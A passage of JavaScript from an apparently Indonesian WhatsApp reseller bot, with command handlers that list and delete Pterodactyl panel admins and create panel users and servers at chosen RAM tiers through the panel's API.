        if (!isOwner) return SkyReply(msg.owner)
        if (!args[0]) return SkyReply(example("id\n\nuntuk melihat id admin ketik *.listadmin*"))
        let cek = await fetch(domain + "/api/application/users?page=1", {
          "method": "GET",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          }
        })
        let res2 = await cek.json();
        let users = res2.data;
        let getid = null
        let idadmin = null
        await users.forEach(async (e) => {
          if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
            getid = e.attributes.username
            idadmin = e.attributes.id
            let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
              "method": "DELETE",
              "headers": {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey
              }
            })
            let res = delusr.ok ? {
              errors: null
            } : await delusr.json()
          }
        })
        if (idadmin == null) return SkyReply("ID Admin Tidak Ditemukan!")
        SkyReply(`Berhasil Menghapus Admin Panel *${capital(getid)}*`)
      }
        break
      case "listadmin": {
        let cek = await fetch(domain + "/api/application/users?page=1", {
          "method": "GET",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          }
        })
        let res2 = await cek.json();
        let users = res2.data;
        let totaladmin = 0
        if (users.length < 1) return SkyReply("Tidak Ada Admin Panel")
        var teks = " *LIST ADMIN PANEL BOT⚡*\n\n"
        await users.forEach((i) => {
          if (i.attributes.root_admin !== true) return
          totaladmin += 1
          teks += `\`📡ID User ${i.attributes.id}\`
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n\n`
        })
        teks += ` Total Admin : *${totaladmin} Admin*`
        Reza.sendText(m.chat, teks, qtoko)
      }
        break
      case "slimecpanel": case "addpanel": case "buatpanel": {
        if (!isOwner && !isPremium) return SkyReply(msg.owner)
        if (global.apikey.length < 1) return SkyReply("Apikey Tidak Ditemukan!")
        if (!args[0]) return SkyReply(example("nama"))
        global.panel = [text.toLowerCase()]
        let imgnya = await prepareWAMessageMedia({ image: await fs.readFileSync("./media/pterodactyl.jpg") }, { upload: Reza.waUploadToServer })
        global.panel = [text.toLowerCase()]
        const msgii = await generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body: proto.Message.InteractiveMessage.Body.fromObject({
                  text: "Silahkan Pilih Ram Server Panel Yang Tersedia Di Bawah Ini"
                }),
                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                  cards: [
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *1GB*
* CPU Server *40%*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram 1GB\",\"title\":\"Create\",\"id\":\".cp1gbv4\"}"
                          }
                        ]
                      })
                    },
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *2GB*
* CPU Server *60%*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram 2GB\",\"title\":\"Create\",\"id\":\".cp2gbv4\"}"
                          }
                        ]
                      })
                    },
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *3GB*
* CPU Server *80%*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram 3GB\",\"title\":\"Create\",\"id\":\".cp3gbv4\"}"
                          }
                        ]
                      })
                    },
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *4GB*
* CPU Server *100%*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram 4GB\",\"title\":\"Create\",\"id\":\".cp4gbv4\"}"
                          }
                        ]
                      })
                    },
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *5GB*
* CPU Server *120%*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram 5GB\",\"title\":\"Create\",\"id\":\".cp5gbv4\"}"
                          }
                        ]
                      })
                    },
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *6GB*
* CPU Server *140%*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram 6GB\",\"title\":\"Create\",\"id\":\".cp6gbv4\"}"
                          }
                        ]
                      })
                    },
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *7GB*
* CPU Server *160%*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram 7GB\",\"title\":\"Create\",\"id\":\".cp7gbv4\"}"
                          }
                        ]
                      })
                    },
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *8GB*
* CPU Server *180%*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram 8GB\",\"title\":\"Create\",\"id\":\".cp8gbv4\"}"
                          }
                        ]
                      })
                    },
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *9GB*
* CPU Server *220%*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram 9GB\",\"title\":\"Create\",\"id\":\".cp9gbv4\"}"
                          }
                        ]
                      })
                    },
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *10GB*
* CPU Server *220%*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram 10GB\",\"title\":\"Create\",\"id\":\".cp10gbv4\"}"
                          }
                        ]
                      })
                    },
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *Unlimited*
* CPU Server *Unlimited*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram Unlimited\",\"title\":\"Create\",\"id\":\".cpunliv4\"}"
                          }
                        ]
                      })
                    }
                  ]
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: qpayment })

        await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "slimecpanel2": case "addpanel2": case "buatpanel2": {
        if (!isOwner && !isPremium) return SkyReply(msg.owner)
        if (global.apikey.length < 1) return SkyReply("Apikey Tidak Ditemukan!")
        if (!args[0]) return SkyReply(example("nama,6283XXX"))
        if (!text.split(",")) return SkyReply(example("nama,6283XXX"))
        var buyyer = text.split(",")[0].toLowerCase()
        if (!buyyer) return SkyReply(example("nama,6283XXX"))
        var ceknya = text.split(",")[1]
        if (!ceknya) return SkyReply(example("nama,6283XXX"))
        var client = text.split(",")[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        var check = await Reza.onWhatsApp(ceknya)
        if (check.length < 1) return SkyReply("Nomor Buyyer Tidak Valid!")
        global.panel2 = [buyyer, client]
        let imgnya = await prepareWAMessageMedia({ image: await fs.readFileSync("./media/pterodactyl.jpg") }, { upload: Reza.waUploadToServer })
        global.panel = [text.toLowerCase()]
        const msgii = await generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body: proto.Message.InteractiveMessage.Body.fromObject({
                  text: "Silahkan Pilih Ram Server Panel Yang Tersedia Di Bawah Ini"
                }),
                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                  cards: [
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *1GB*
* CPU Server *40%*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram 1GB\",\"title\":\"Create\",\"id\":\".cp1gbv5\"}"
                          }
                        ]
                      })
                    },
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *2GB*
* CPU Server *60%*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram 2GB\",\"title\":\"Create\",\"id\":\".cp2gbv5\"}"
                          }
                        ]
                      })
                    },
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *3GB*
* CPU Server *80%*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram 3GB\",\"title\":\"Create\",\"id\":\".cp3gbv5\"}"
                          }
                        ]
                      })
                    },
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *4GB*
* CPU Server *100%*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram 4GB\",\"title\":\"Create\",\"id\":\".cp4gbv5\"}"
                          }
                        ]
                      })
                    },
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *5GB*
* CPU Server *120%*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram 5GB\",\"title\":\"Create\",\"id\":\".cp5gbv5\"}"
                          }
                        ]
                      })
                    },
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *6GB*
* CPU Server *140%*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram 6GB\",\"title\":\"Create\",\"id\":\".cp6gbv5\"}"
                          }
                        ]
                      })
                    },
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *7GB*
* CPU Server *160%*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram 7GB\",\"title\":\"Create\",\"id\":\".cp7gbv5\"}"
                          }
                        ]
                      })
                    },
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *8GB*
* CPU Server *180%*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram 8GB\",\"title\":\"Create\",\"id\":\".cp8gbv5\"}"
                          }
                        ]
                      })
                    },
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *9GB*
* CPU Server *220%*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram 9GB\",\"title\":\"Create\",\"id\":\".cp9gbv5\"}"
                          }
                        ]
                      })
                    },
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *10GB*
* CPU Server *220%*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram 10GB\",\"title\":\"Create\",\"id\":\".cp10gbv5\"}"
                          }
                        ]
                      })
                    },
                    {
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *Unlimited*
* CPU Server *Unlimited*`
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© Powered By " + namabot2
                      }),
                      header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: false,
                        ...imgnya
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                          {
                            name: "quick_reply",
                            buttonParamsJson: "{\"display_text\":\"Create Server Ram Unlimited\",\"title\":\"Create\",\"id\":\".cpunliv5\"}"
                          }
                        ]
                      })
                    }
                  ]
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: qpayment })


        await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "cp1gbv4": case "cp2gbv4": case "cp3gbv4": case "cp4gbv4": case "cp5gbv4": case "cp6gbv4": case "cp7gbv4": case "cp8gbv4": case "cp9gbv4": case "cp10gbv4": case "cpunliv4": {
        if (!isOwner && !isPremium) return SkyReply(msg.owner)
        if (global.panel == null) return SkyReply('Nama/Username Tidak Di Temukan')
        var ram
        var disknya
        var cpu
        if (command == "cp1gbv4") {
          ram = "1125"
          disknya = "1125"
          cpu = "40"
        } else if (command == "cp2gbv4") {
          ram = "2125"
          disknya = "2125"
          cpu = "60"
        } else if (command == "cp3gbv4") {
          ram = "3125"
          disknya = "3125"
          cpu = "80"
        } else if (command == "cp4gbv4") {
          ram = "4125"
          disknya = "4125"
          cpu = "100"
        } else if (command == "cp5gbv4") {
          ram = "5125"
          disknya = "5125"
          cpu = "120"
        } else if (command == "cp6gbv4") {
          ram = "6125"
          disknya = "6125"
          cpu = "140"
        } else if (command == "cp7gbv4") {
          ram = "7125"
          disknya = "7125"
          cpu = "160"
        } else if (command == "cp8gbv4") {
          ram = "8125"
          disknya = "8125"
          cpu = "180"
        } else if (command == "cp9gbv4") {
          ram = "9124"
          disknya = "9125"
          cpu = "200"
        } else if (command == "cp10gbv4") {
          ram = "10125"
          disknya = "10125"
          cpu = "220"
        } else {
          ram = "0"
          disknya = "0"
          cpu = "0"
        }
        if (!isOwner && !isPremium) return SkyReply(msg.owner)
        let username = global.panel[0].toLowerCase()
        let email = username + "@gmail.com"
        let name = capital(username) + " Server"
        let password = username + crypto.randomBytes(2).toString('hex')
        let f = await fetch(domain + "/api/application/users", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          },
          "body": JSON.stringify({
            "email": email,
            "username": username.toLowerCase(),
            "first_name": name,
            "last_name": "Server",
            "language": "en",
            "password": password.toString()
          })
        })
        let data = await f.json();
        if (data.errors) return SkyReply(JSON.stringify(data.errors[0], null, 2))
        let user = data.attributes
        let desc = tanggal(Date.now())
        let usr_id = user.id
        let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
          "method": "GET",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          }
        })
        let data2 = await f1.json();
        let startup_cmd = data2.attributes.startup
        let f2 = await fetch(domain + "/api/application/servers", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
          },
          "body": JSON.stringify({
            "name": name,
            "description": desc,
            "user": usr_id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
              "INST": "npm",
              "USER_UPLOAD": "0",
              "AUTO_UPDATE": "0",
              "CMD_RUN": "npm start"
            },
            "limits": {
              "memory": ram,
              "swap": 0,
              "disk": disknya,
              "io": 500,
              "cpu": cpu
            },
            "feature_limits": {
              "databases": 5,
              "backups": 5,
              "allocations": 5
            },
            deploy: {
              locations: [parseInt(loc)],
              dedicated_ip: false,
              port_range: [],
            },
          })
        })
        let result = await f2.json()
        if (result.errors) return SkyReply(JSON.stringify(result.errors[0], null, 2))
        let server = result.attributes
        var orang
        if (isGroup) {
          orang = m.sender
          await SkyReply("*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
        } else {
          orang = m.chat
        }
        var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu + "%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
`
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: [m.sender],
                  externalAdReply: {
                    showAdAttribution: true
                  }
                }, body: proto.Message.InteractiveMessage.Body.create({
                  text: teks
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [{
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
                  },
                  {
                    "name": "cta_copy",
                    "buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
                  },
                  {
                    "name": "cta_copy",
                    "buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
                  }]
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: qchanel })
        await Reza.relayMessage(orang, msgii.message, {
          messageId: msgii.key.id
        })
        global.panel = null
      }
        break
      case "cp1gbv5": case "cp2gbv5": case "cp3gbv5": case "cp4gbv5": case "cp5gbv5": case "cp6gbv5": case "cp7gbv5": case "cp8gbv5": case "cp9gbv5": case "cp10gbv5": case "cpunliv5": {
        if (!isOwner && !isPremium) return SkyReply(msg.owner)
        if (global.panel2 == null) return SkyReply('Nama/Username Tidak Di Temukan')
        var ram
        var disknya
        var cpu
        if (command == "cp1gbv5") {
          ram = "1125"
          disknya = "1125"
          cpu = "40"
        } else if (command == "cp2gbv5") {
          ram = "2125"
          disknya = "2125"
          cpu = "60"
        } else if (command == "cp3gbv5") {
          ram = "3125"
          disknya = "3125"
          cpu = "80"
        } else if (command == "cp4gbv5") {
          ram = "4125"
          disknya = "4125"
          cpu = "100"
        } else if (command == "cp5gbv5") {
          ram = "5125"
          disknya = "5125"
          cpu = "120"
        } else if (command == "cp6gbv5") {
          ram = "6125"
          disknya = "6125"
          cpu = "140"
        } else if (command == "cp7gbv5") {
          ram = "7125"
          disknya = "7125"
          cpu = "160"
        } else if (command == "cp8gbv5") {
          ram = "8125"
          disknya = "8125"
          cpu = "180"
        } else if (command == "cp9gbv5") {
          ram = "9124"
          disknya = "9125"
          cpu = "200"
        } else if (command == "cp10gbv5") {
          ram = "10125"
          disknya = "10125"
          cpu = "220"
        } else {
          ram = "0"
          disknya = "0"
          cpu = "0"
        }
        if (!isOwner && !isPremium) return SkyReply(msg.owner)
        let username = global.panel2[0].toLowerCase()
        let email = username + "@gmail.com"
        let name = capital(username) + " Server"
        let password = username + crypto.randomBytes(2).toString('hex')
        let f = await fetch(domain + "/api/application/users", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          },
          "body": JSON.stringify({
            "email": email,
            "username": username.toLowerCase(),
            "first_name": name,
            "last_name": "Server",
            "language": "en",
            "password": password.toString()
          })
        })
        let data = await f.json();
        if (data.errors) return SkyReply(JSON.stringify(data.errors[0], null, 2))
        let user = data.attributes
        let desc = tanggal(Date.now())
        let usr_id = user.id
        let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
          "method": "GET",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          }
        })
        let data2 = await f1.json();
        let startup_cmd = data2.attributes.startup
        let f2 = await fetch(domain + "/api/application/servers", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
          },
          "body": JSON.stringify({
            "name": name,
            "description": desc,
            "user": usr_id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
              "INST": "npm",
              "USER_UPLOAD": "0",
              "AUTO_UPDATE": "0",
              "CMD_RUN": "npm start"
            },
            "limits": {
              "memory": ram,
              "swap": 0,
              "disk": disknya,
              "io": 500,
              "cpu": cpu
            },
            "feature_limits": {
              "databases": 5,
              "backups": 5,
              "allocations": 5
            },
            deploy: {
              locations: [parseInt(loc)],
              dedicated_ip: false,
              port_range: [],
            },
          })
        })
        let result = await f2.json()
        if (result.errors) return SkyReply(JSON.stringify(result.errors[0], null, 2))
        let server = result.attributes
        var orang = global.panel2[1]
        await SkyReply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Nomor ${orang.split("@")[0]}`)
        var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu + "%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
`
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: [m.sender],
                  externalAdReply: {
                    showAdAttribution: true
                  }
                }, body: proto.Message.InteractiveMessage.Body.create({
                  text: teks
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [{
                    "name": "cta_url",
                    "buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
                  },
                  {
                    "name": "cta_copy",
                    "buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
                  },
                  {
                    "name": "cta_copy",
                    "buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
                  }]
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: qchanel })
        await Reza.relayMessage(orang, msgii.message, {
          messageId: msgii.key.id
        })
        global.panel2 = null
      }
        break
      case "listpanel": case "listp": case "listserver": {
        if (global.apikey.length < 1) return SkyReply("Apikey Tidak Ditemukan!")
